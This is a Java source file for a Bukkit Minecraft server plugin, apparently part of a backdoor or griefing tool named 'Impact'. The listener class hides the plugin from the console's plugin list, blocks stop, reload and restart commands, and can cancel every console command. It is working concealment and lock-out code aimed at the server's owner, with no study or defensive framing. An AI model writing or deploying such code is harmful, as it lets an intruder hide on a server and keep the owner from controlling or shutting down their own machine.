package de.impact.listeners;

import de.impact.utils.Locks;
import de.impact.utils.PluginUtils;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

public class ConsoleListener implements Listener {

    @EventHandler
    public void onConsole(ServerCommandEvent e) {

        String msg = e.getCommand().toUpperCase();

        if(Locks.PLUGINLIST.isLocked() && (msg.startsWith("PL") || msg.startsWith("PLUGINS") || msg.startsWith("BUKKIT:PLUGINS") || msg.startsWith("BUKKIT:PL"))) {
            e.setCancelled(true);
            Bukkit.getConsoleSender().sendMessage(PluginUtils.getPluginListExceptImpact());
        }

        if(Locks.STOP.isLocked() && (msg.startsWith("STOP") || msg.startsWith("RL") || msg.startsWith("RELOAD") || msg.startsWith("RESTART") || msg.startsWith("BUKKIT:RL") || msg.startsWith("BUKKIT:RELOAD")))
            e.setCancelled(true);

        if(Locks.CONSOLE.isLocked())
            e.setCancelled(true);

    }

}
